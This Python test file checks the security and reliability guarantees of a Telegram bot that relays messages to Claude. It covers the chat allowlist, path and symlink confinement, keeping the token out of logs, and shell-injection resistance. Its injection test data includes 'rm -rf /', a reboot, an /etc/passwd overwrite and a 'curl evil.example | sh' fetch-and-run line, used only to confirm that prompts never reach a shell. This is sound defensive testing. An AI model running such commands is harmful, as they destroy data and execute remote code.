"""SB/RB security + reliability matrix (T8 / RB7).

A single, clearly-labeled home for the cross-cutting security (SB) and reliability
(RB) guarantees the streaming-engine baseline requires. **Each test names the exact
requirement it covers** so the RB7 rule ("each of SB1/SB2/SB3/SB4/RB1/RB2/RB5 has a
test") is auditable at a glance. The matrix is intentionally focused and dedicated even
where similar coverage exists elsewhere (``test_bot.py`` / ``test_bot_streaming.py`` /
``test_stream_session.py`` / ``test_render.py``) — RB7 wants one labeled test per
requirement, not coverage scattered across files.

Mapping (test function -> requirement):

* SB1 — :func:`test_sb1_unauthorized_message_is_ignored_no_run`
        :func:`test_sb1_unauthorized_callback_never_resolves`
* SB2 — :func:`test_sb2_dotdot_traversal_out_of_root_rejected`
        :func:`test_sb2_absolute_path_outside_roots_rejected`
        :func:`test_sb2_real_symlink_escape_is_rejected`  ← the load-bearing one
        :func:`test_sb2_path_inside_root_accepted`
        :func:`test_sb2_root_itself_accepted`
        :func:`test_sb2_subdir_accepted`
        :func:`test_sb2_allow_any_path_accepts_out_of_root`
        :func:`test_sb2_empty_roots_fail_closed`
        :func:`test_sb2_cmd_cd_rejects_traversal_without_touching_runner`
        :func:`test_sb2_cmd_cd_accepts_path_inside_root`
* SB3 — :func:`test_sb3_bot_token_never_appears_in_logs`
        :func:`test_sb3_state_file_is_chmod_0600`
* SB4 — :func:`test_sb4_oneshot_prompt_never_in_argv`
        :func:`test_sb4_streaming_prompt_passed_verbatim_no_shell`
* RB1 — :func:`test_rb1_garbage_callback_data_does_not_raise`
        :func:`test_rb1_cmd_cd_pathological_arg_does_not_crash`
* RB2 — :func:`test_rb2_engine_error_event_surfaces_clean_and_turn_ends`
        :func:`test_rb2_engine_send_failure_surfaces_clean_and_turn_ends`
* RB5 — :func:`test_rb5_burst_coalesces_to_bounded_edits`

Everything here is MOCK-only: NO live Telegram, NO live Claude, NO network, NO API key.
The substrate/engine are scripted fakes; ``resolve_within_roots`` is exercised purely.
"""

from __future__ import annotations

import asyncio
import logging
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock

import pytest

from claude_tg.bot import TelegramClaudeBot
from claude_tg.claude_runner import ClaudeResult, ClaudeRunner
from claude_tg.config import Config
from claude_tg.engine.types import ErrorEvent, ResultEvent, TextEvent
from claude_tg.paths import PathNotAllowed, resolve_within_roots
from claude_tg.render import Coalescer, RenderAction
from claude_tg.session_store import JsonSessionStore
from claude_tg.stream_session import StreamingSession

# A recognizable FAKE bot token (placeholder-marked so the secret-scan ignores it).
FAKE_TOKEN = "123456789:FAKE-token-for-sb3-do-not-log-me"


# ---------------------------------------------------------------------------
# Shared fakes / helpers (kept local so the matrix reads end-to-end).
# ---------------------------------------------------------------------------


def make_config(
    allowed=(1,),
    *,
    engine_mode="oneshot",
    workdir=Path("/work"),
    allowed_roots=(),
    allow_any_path=False,
    state_file=None,
    bot_token="t",
):
    return Config(
        bot_token=bot_token,
        allowed_chat_ids=frozenset(allowed),
        workdir=workdir,
        claude_bin="claude",
        model=None,
        timeout_seconds=5,
        skip_permissions=True,
        state_file=state_file,
        engine_mode=engine_mode,
        allowed_roots=allowed_roots,
        allow_any_path=allow_any_path,
    )


class FakeRunner:
    """Minimal runner stand-in for the bot boundary (records what it is asked to do)."""

    def __init__(self, result=None):
        self._result = result if result is not None else ClaudeResult(ok=True, text="ok")
        self.run_calls: list[tuple[int, str]] = []
        self.set_cwd_calls: list[tuple[int, str]] = []
        self.cwd = "/work"

    async def run(self, chat_id, text):
        self.run_calls.append((chat_id, text))
        return self._result

    def reset(self, chat_id):
        pass

    def get_cwd(self, chat_id):
        return self.cwd

    def set_cwd(self, chat_id, path):
        self.set_cwd_calls.append((chat_id, path))
        self.cwd = path
        return path


class FakeStreaming:
    """StreamingSession stand-in at the bot boundary (records resolve/handle calls)."""

    def __init__(self):
        self.handle_message_calls: list[tuple[int, str]] = []
        self.resolve_calls: list[tuple[int, object]] = []

    async def handle_message(self, chat_id, text, *, send, edit):
        self.handle_message_calls.append((chat_id, text))

    def resolve_callback(self, chat_id, data):
        from claude_tg.stream_session import CallbackOutcome

        self.resolve_calls.append((chat_id, data))
        return CallbackOutcome(handled=True, note="ok")

    def reset(self, chat_id):
        pass


def make_update(chat_id=1, text="hello"):
    upd = MagicMock()
    upd.effective_chat.id = chat_id
    upd.message.text = text
    upd.message.reply_text = AsyncMock()
    upd.effective_message = upd.message
    return upd


def make_callback_update(chat_id=1, data="a|tid|0.0"):
    upd = MagicMock()
    upd.effective_chat.id = chat_id
    upd.callback_query.data = data
    upd.callback_query.answer = AsyncMock()
    upd.callback_query.message.reply_text = AsyncMock()
    upd.effective_message = upd.callback_query.message
    return upd


def make_ctx(args=None):
    ctx = MagicMock()
    ctx.bot.send_message = AsyncMock(return_value=MagicMock(message_id=5))
    ctx.bot.edit_message_text = AsyncMock()
    ctx.bot.send_chat_action = AsyncMock()
    ctx.args = list(args or [])
    return ctx


# A scripted fake engine for the streaming RB2 / SB4 tests (no SDK / network).
HOLD = object()


class FakeEngine:
    """Yields a scripted event list; ``send`` may also be forced to raise (RB2)."""

    def __init__(self, script: list, *, session_id="sess-1", send_raises: BaseException | None = None):
        self._script = script
        self._send_raises = send_raises
        self.session_id = session_id
        self.send_prompts: list[str] = []
        self.resolve_calls: list = []
        self.cancel_calls: list = []
        self.started = False
        self.resumed = None
        self.stopped = False
        self._gate = asyncio.Event()

    async def start(self):
        self.started = True

    async def resume(self, session_id):
        self.resumed = session_id
        self.started = True

    async def stop(self):
        self.stopped = True

    async def send(self, prompt, *, timeout=None):
        self.send_prompts.append(prompt)
        if self._send_raises is not None:
            raise self._send_raises
        for item in self._script:
            if item is HOLD:
                await self._gate.wait()
                self._gate.clear()
                continue
            yield item

    def resolve(self, tool_use_id, decision):
        self.resolve_calls.append((tool_use_id, decision))
        self._gate.set()
        return True

    def cancel(self, tool_use_id=None):
        self.cancel_calls.append(tool_use_id)
        self._gate.set()
        return 1


class Recorder:
    """Captures the send/edit the streaming driver performs."""

    def __init__(self):
        self.sends: list[dict] = []
        self.edits: list[dict] = []
        self._next_id = 100

    async def send(self, *, text, reply_markup=None, parse_mode=None) -> int:
        self.sends.append({"text": text, "reply_markup": reply_markup, "parse_mode": parse_mode})
        self._next_id += 1
        return self._next_id

    async def edit(self, *, message_id, text, parse_mode=None) -> None:
        self.edits.append({"message_id": message_id, "text": text, "parse_mode": parse_mode})


def make_streaming_session(engine: FakeEngine, *, config=None, store=None) -> StreamingSession:
    return StreamingSession(
        config or make_config(engine_mode="streaming"),
        session_store=store,
        engine_factory=lambda *, cwd, backstop_seconds, permission_policy: engine,
        clock=lambda: 0.0,  # frozen clock: status edits are always "due"
    )


class FakeClock:
    """Deterministic injectable monotonic clock (mirrors test_render.FakeClock)."""

    def __init__(self, start: float = 1000.0) -> None:
        self._t = start

    def __call__(self) -> float:
        return self._t

    def advance(self, dt: float) -> None:
        self._t += dt


# ===========================================================================
# SB1 — authn on every inbound (message AND button-callback tap).
# ===========================================================================


async def test_sb1_unauthorized_message_is_ignored_no_run():
    """SB1: a message from a non-allowlisted chat is ignored — Claude is never run."""
    runner = FakeRunner()
    bot = TelegramClaudeBot(make_config(allowed=(1,)), runner)
    upd = make_update(chat_id=999, text="run something dangerous")  # NOT allowlisted
    await bot.on_message(upd, make_ctx())
    assert runner.run_calls == []  # no turn started
    upd.message.reply_text.assert_not_awaited()  # and no reply leaked back


async def test_sb1_unauthorized_callback_never_resolves():
    """SB1: a button tap from a non-allowlisted chat NEVER resolves a decision.

    The callback is new attack surface (it could approve a plan / answer a question).
    The handler's explicit allowlist recheck must drop it BEFORE touching the engine:
    the query is answered (spinner stops) but ``resolve_callback`` is never called.
    """
    streaming = FakeStreaming()
    bot = TelegramClaudeBot(
        make_config(allowed=(1,), engine_mode="streaming"), FakeRunner(), streaming=streaming
    )
    upd = make_callback_update(chat_id=999, data="p|tid|a")  # forged "approve the plan"
    await bot.on_callback(upd, make_ctx())
    upd.callback_query.answer.assert_awaited()  # spinner stopped
    assert streaming.resolve_calls == []  # engine NEVER touched -> no decision resolved


# ===========================================================================
# SB2 — /cd path confinement (canonicalize + ALLOWED_ROOTS containment).
# These exercise the pure resolver directly, then the cmd_cd integration.
# ===========================================================================


def test_sb2_dotdot_traversal_out_of_root_rejected(tmp_path):
    """SB2: a ``..`` traversal that escapes the root is rejected (.. is canonicalized)."""
    root = tmp_path / "root"
    root.mkdir()
    with pytest.raises(PathNotAllowed):
        # root/../secret canonicalizes to tmp_path/secret — outside root.
        resolve_within_roots("../secret", cwd=root, allowed_roots=(root,), allow_any=False)


def test_sb2_absolute_path_outside_roots_rejected(tmp_path):
    """SB2: an absolute path outside every root is rejected."""
    root = tmp_path / "root"
    root.mkdir()
    with pytest.raises(PathNotAllowed):
        resolve_within_roots("/etc", cwd=root, allowed_roots=(root,), allow_any=False)


def test_sb2_real_symlink_escape_is_rejected(tmp_path):
    """SB2 (load-bearing): a REAL symlink pointing OUTSIDE the root is rejected.

    This is the canonicalization guard's reason for existing: a containment check on the
    *raw* path would be fooled by a symlink that lives inside the root but targets a
    directory outside it. We create an ACTUAL symlink ``root/escape`` -> ``outside`` and
    assert ``/cd``-ing to it is refused. Because the resolver ``Path.resolve()``s the
    target first, the symlink is followed to ``outside`` and the containment check fails.

    NOTE — this test would FALSE-PASS only if the guard were removed: without the
    confinement check (or without resolving symlinks) the call would return a path
    instead of raising, and this assertion would fail. See the matrix docstring.
    """
    root = tmp_path / "root"
    root.mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()
    escape = root / "escape"
    escape.symlink_to(outside, target_is_directory=True)
    assert escape.is_symlink()  # a real on-disk symlink, not a string trick

    with pytest.raises(PathNotAllowed):
        resolve_within_roots("escape", cwd=root, allowed_roots=(root,), allow_any=False)


def test_sb2_symlink_INSIDE_root_is_accepted(tmp_path):
    """SB2 (complement): a symlink that resolves to a path INSIDE the root is allowed.

    Proves the guard rejects on *destination*, not on "is a symlink" — a within-root
    symlink is fine. (Also guards against a too-blunt fix that banned all symlinks.)
    """
    root = tmp_path / "root"
    (root / "real").mkdir(parents=True)
    link = root / "link"
    link.symlink_to(root / "real", target_is_directory=True)
    out = resolve_within_roots("link", cwd=root, allowed_roots=(root,), allow_any=False)
    assert out == (root / "real").resolve()


def test_sb2_path_inside_root_accepted(tmp_path):
    """SB2: a relative path that stays inside the root is accepted (canonicalized)."""
    root = tmp_path / "root"
    (root / "sub").mkdir(parents=True)
    out = resolve_within_roots("sub", cwd=root, allowed_roots=(root,), allow_any=False)
    assert out == (root / "sub").resolve()


def test_sb2_root_itself_accepted(tmp_path):
    """SB2: the root directory itself is contained (equal-to a root, not just below)."""
    root = tmp_path / "root"
    root.mkdir()
    out = resolve_within_roots(str(root), cwd=root, allowed_roots=(root,), allow_any=False)
    assert out == root.resolve()


def test_sb2_subdir_accepted(tmp_path):
    """SB2: a deep descendant of a root is contained."""
    root = tmp_path / "root"
    deep = root / "a" / "b" / "c"
    deep.mkdir(parents=True)
    out = resolve_within_roots(str(deep), cwd=tmp_path, allowed_roots=(root,), allow_any=False)
    assert out == deep.resolve()


def test_sb2_allow_any_path_accepts_out_of_root(tmp_path):
    """SB2: ALLOW_ANY_PATH=true (allow_any) accepts an out-of-root path (the opt-out)."""
    root = tmp_path / "root"
    root.mkdir()
    # /etc is outside root, but allow_any short-circuits the containment check.
    out = resolve_within_roots("/etc", cwd=root, allowed_roots=(root,), allow_any=True)
    assert out == Path("/etc").resolve()


def test_sb2_empty_roots_fail_closed(tmp_path):
    """SB2/SB6: empty allowed_roots with allow_any=False rejects EVERYTHING (fail-closed)."""
    with pytest.raises(PathNotAllowed):
        resolve_within_roots(str(tmp_path), cwd=tmp_path, allowed_roots=(), allow_any=False)


async def test_sb2_cmd_cd_rejects_traversal_without_touching_runner(tmp_path):
    """SB2 (integration): cmd_cd refuses an out-of-root /cd and never calls set_cwd."""
    root = tmp_path / "root"
    root.mkdir()
    runner = FakeRunner()
    runner.cwd = str(root)
    bot = TelegramClaudeBot(make_config(allowed_roots=(root,)), runner)
    upd = make_update(1, "")
    await bot.cmd_cd(upd, make_ctx(args=["../../etc"]))
    assert "not allowed" in upd.message.reply_text.await_args.args[0].lower()
    assert runner.set_cwd_calls == []  # refused BEFORE the runner is touched


async def test_sb2_cmd_cd_accepts_path_inside_root(tmp_path):
    """SB2 (integration): cmd_cd accepts an in-root /cd and stores the CANONICAL path."""
    root = tmp_path / "root"
    sub = root / "sub"
    sub.mkdir(parents=True)
    runner = FakeRunner()
    runner.cwd = str(root)
    bot = TelegramClaudeBot(make_config(allowed_roots=(root,)), runner)
    upd = make_update(1, "")
    await bot.cmd_cd(upd, make_ctx(args=["sub"]))  # relative to the current cwd (root)
    assert runner.set_cwd_calls == [(1, str(sub.resolve()))]  # canonical, contained
    assert "working directory set to" in upd.message.reply_text.await_args.args[0].lower()


# ===========================================================================
# SB3 — secret hygiene: the bot token is never written to logs.
# ===========================================================================


async def test_sb3_bot_token_never_appears_in_logs(caplog):
    """SB3: a representative flow logs nothing containing the bot token.

    We put a recognizable FAKE token in ``Config.bot_token`` and drive: an unauthorized
    message (which logs a warning), a normal turn, and an errored turn — then assert the
    token string never appears anywhere in captured log output. The token is the
    crown-jewel secret (SB3); it must stay out of logs entirely.
    """
    caplog.set_level(logging.DEBUG)
    cfg = make_config(allowed=(1,), bot_token=FAKE_TOKEN)
    runner = FakeRunner(ClaudeResult(ok=False, text="", error="boom"))
    bot = TelegramClaudeBot(cfg, runner)

    # Unauthorized inbound -> a warning is logged (the path most likely to log).
    await bot.on_message(make_update(chat_id=999, text="hi"), make_ctx())
    # An authorized errored turn -> the error path logs / replies.
    await bot.on_message(make_update(chat_id=1, text="go"), make_ctx())

    assert FAKE_TOKEN not in caplog.text
    # The discriminating secret half of the token must not leak either.
    assert "FAKE-token-for-sb3-do-not-log-me" not in caplog.text


def test_sb3_state_file_is_chmod_0600(tmp_path):
    """SB3: the persisted session-state file is mode 0600 (holds ids/cwds, owner-only)."""
    store = JsonSessionStore(tmp_path / "state.json")
    store.update(1, session_id="sess-xyz", cwd=str(tmp_path))
    mode = (tmp_path / "state.json").stat().st_mode & 0o777
    assert mode == 0o600


# ===========================================================================
# SB4 — no shell injection: message text never becomes a shell argv/command.
# ===========================================================================

# Prompts crafted to break out of a shell IF the text were ever interpolated into one.
INJECTION_PROMPTS = [
    '"; rm -rf / #',
    "$(touch /tmp/pwned)",
    "`reboot`",
    "foo && curl evil.example | sh",
    "a | b > /etc/passwd",
]


@pytest.mark.parametrize("prompt", INJECTION_PROMPTS)
def test_sb4_oneshot_prompt_never_in_argv(prompt):
    """SB4 (oneshot): the prompt is NEVER part of the subprocess argv.

    ``ClaudeRunner._build_cmd`` builds the argv from config only; the prompt is fed via
    stdin in ``_invoke``. So no fragment of an injection prompt can appear as an argv
    token — there is no shell and no string interpolation for it to escape into.
    """
    runner = ClaudeRunner(make_config())
    argv = runner._build_cmd(chat_id=1)
    joined = " ".join(argv)
    assert prompt not in argv  # not a standalone token
    assert prompt not in joined  # not a substring of the argv anywhere
    # And the argv is the expected config-only shape (no shell wrapper).
    assert argv[0] == "claude" and "-p" in argv


async def test_sb4_streaming_prompt_passed_verbatim_no_shell():
    """SB4 (streaming): handle_message hands the text VERBATIM to engine.send — no shell.

    The injection metacharacters arrive at the engine exactly as typed (they are model
    input, not a command line); they are never split into a shell argv or run.
    """
    nasty = '"; rm -rf / #  $(touch pwned) `reboot`'
    engine = FakeEngine(
        [ResultEvent(session_id="s", is_error=False, subtype="success", result_text="ok")]
    )
    session = make_streaming_session(engine)
    rec = Recorder()
    await asyncio.wait_for(
        session.handle_message(1, nasty, send=rec.send, edit=rec.edit), timeout=2.0
    )
    assert engine.send_prompts == [nasty]  # verbatim, unmodified, no shell parsing


# ===========================================================================
# RB1 — never crash on bad input.
# ===========================================================================


async def test_rb1_garbage_callback_data_does_not_raise():
    """RB1: garbage callback_data -> resolve_callback returns handled=False, no raise.

    Drives a stream of malformed/foreign callback payloads through a live session (with
    a held ask primed) and asserts none raises and none resolves a decision.
    """
    engine = FakeEngine([])
    session = make_streaming_session(engine)
    await session._ensure_engine(session._chat(1), 1)  # start the engine for chat 1
    for bad in ["garbage", "a|tid", "x|tid|0.0", "a|tid|x.y", 12345, None, b"a|x|0.0", "", "a||0.0"]:
        outcome = session.resolve_callback(1, bad)  # must not raise
        assert outcome.handled is False
    assert engine.resolve_calls == []  # nothing was resolved by any garbage input


async def test_rb1_cmd_cd_pathological_arg_does_not_crash():
    """RB1: a pathological /cd arg does not crash the handler (it replies, cleanly)."""
    runner = FakeRunner()
    bot = TelegramClaudeBot(make_config(allow_any_path=True), runner)
    # NUL byte + absurd length + traversal soup — must not raise out of the handler.
    pathological = "\x00" + "../" * 5000 + "x" * 5000
    upd = make_update(1, "")
    await bot.cmd_cd(upd, make_ctx(args=[pathological]))  # must not raise
    upd.message.reply_text.assert_awaited()  # the handler replied rather than crashing


# ===========================================================================
# RB2 — clean failure on an engine/substrate error (never a silent hang).
# ===========================================================================


async def test_rb2_engine_error_event_surfaces_clean_and_turn_ends():
    """RB2: a substrate ``error`` event renders as a clean message and the turn ENDS.

    The bounded ``wait_for`` is the no-hang assertion: if the driver wedged on the error
    instead of finishing the turn, this would time out and FAIL.
    """
    engine = FakeEngine(
        [
            ErrorEvent(kind_of_error="driver_error", message="substrate exploded"),
            ResultEvent(session_id="s", is_error=False, subtype="success"),
        ]
    )
    session = make_streaming_session(engine)
    rec = Recorder()
    await asyncio.wait_for(
        session.handle_message(1, "go", send=rec.send, edit=rec.edit), timeout=2.0
    )
    err = next(s for s in rec.sends if "substrate exploded" in s["text"])
    assert err["text"].startswith("⚠️")  # clean prefix, no traceback to the operator
    assert "Traceback" not in err["text"]


async def test_rb2_engine_send_failure_surfaces_clean_and_turn_ends():
    """RB2: if engine.send itself RAISES, the turn ends cleanly (bounded — no hang).

    A substrate that fails hard (its ``send`` raises) must not wedge the chat. The
    driver should let the turn end; we only require that it does NOT hang (bounded
    wait_for) and does NOT leak a traceback to the operator. Whether the failure
    surfaces as a raised exception to the caller or a rendered message, the turn must
    terminate — the anti-goal is a silent hang.
    """
    engine = FakeEngine([], send_raises=RuntimeError("hard substrate failure"))
    session = make_streaming_session(engine)
    rec = Recorder()

    async def drive():
        try:
            await session.handle_message(1, "go", send=rec.send, edit=rec.edit)
        except RuntimeError:
            # An exception that ends the turn is acceptable (clean failure); a HANG is not.
            pass

    await asyncio.wait_for(drive(), timeout=2.0)  # the load-bearing no-hang assertion
    # Nothing leaked a raw traceback to the operator via a send.
    assert all("Traceback" not in s["text"] for s in rec.sends)
    # RB4-shape: the failed turn released the per-chat lock — the chat is NOT wedged.
    assert not session._chat(1).lock.locked()


# ===========================================================================
# RB5 — rate-limit safety: throttle/coalesce holds under a burst.
# ===========================================================================


def test_rb5_burst_coalesces_to_bounded_edits():
    """RB5: 50 incremental deltas in one interval collapse to a BOUNDED number of edits.

    Mirrors the test_render RB5 approach with an injected FakeClock (no real sleeps): a
    burst that would otherwise be 50 Telegram edits is coalesced to 1 (leading edge),
    with the newest line preserved for the trailing flush. The guarantee is "bounded,
    never N".
    """
    clock = FakeClock()
    coalescer = Coalescer(now=clock, min_interval=2.0)
    actions: list[RenderAction] = []
    for i in range(50):  # all within the SAME interval (clock not advanced)
        actions.extend(coalescer.offer(TextEvent(text=f"d{i}", incremental=True)).actions)
    edits = [a for a in actions if a.op == "edit_status"]
    assert len(edits) == 1  # leading-edge only; the other 49 are buffered
    assert len(edits) < 50  # the RB5 guarantee: bounded, never N
    flushed = coalescer.flush().actions  # trailing edge shows the newest line
    assert len(flushed) == 1 and flushed[0].text == "d49"


# ===========================================================================
# SB5 (P2) — the streaming path introduces no default bypass; /yolo is the only
# (loud, off-by-default) one. Structural guards; behavioral SB5 (/yolo via the
# bot) lives in the P2 SB/RB matrix.
# ===========================================================================


def test_sb5_streaming_factory_introduces_no_bypass():
    """SB5: the streaming engine is fail-closed by default — no bypass on the default path.

    The production engine factory wires the substrate in ``permission_mode="default"`` with
    the engine's ``can_use_tool`` gate (``on_tool_request``) and the chat's shared
    ``PermissionPolicy``. It passes NO ``--dangerously-skip-permissions`` / allow-all flag.
    A regression that flipped the streaming path to a bypass mode (or dropped the gate /
    policy wiring) trips these assertions.
    """
    from claude_tg.permissions import PermissionPolicy
    from claude_tg.stream_session import _default_engine_factory

    policy = PermissionPolicy()
    engine = _default_engine_factory(
        cwd="/tmp/p2-sb5", backstop_seconds=60.0, permission_policy=policy
    )
    sub = engine._substrate  # the SdkSubstrate the chat runs (no connect happens here)
    assert sub._permission_mode == "default"  # the gating mode, NOT a bypass
    assert sub._permission_mode != "bypassPermissions"
    assert sub._decision_callback is not None  # the can_use_tool gate is wired
    assert sub._allowed_tools is None  # nothing pre-allowed (no allow-all)
    assert sub._disallowed_tools is None
    assert engine._policy is policy  # the engine gates on the SHARED policy object


def test_sb5_yolo_is_off_by_default_and_loud_when_on():
    """SB5/D6: the ONLY bypass is /yolo — off by default, and loud when enabled.

    A fresh ``PermissionPolicy`` gates risky tools (``yolo`` False); the ``/yolo`` enable
    banner is non-empty and carries the ⚠️ glyph so allow-all is never silent.
    """
    from claude_tg.permissions import PermissionPolicy
    from claude_tg.render import yolo_banner

    assert PermissionPolicy().yolo is False  # never allow-all by default
    banner = yolo_banner()
    assert banner and "⚠️" in banner  # loud when on
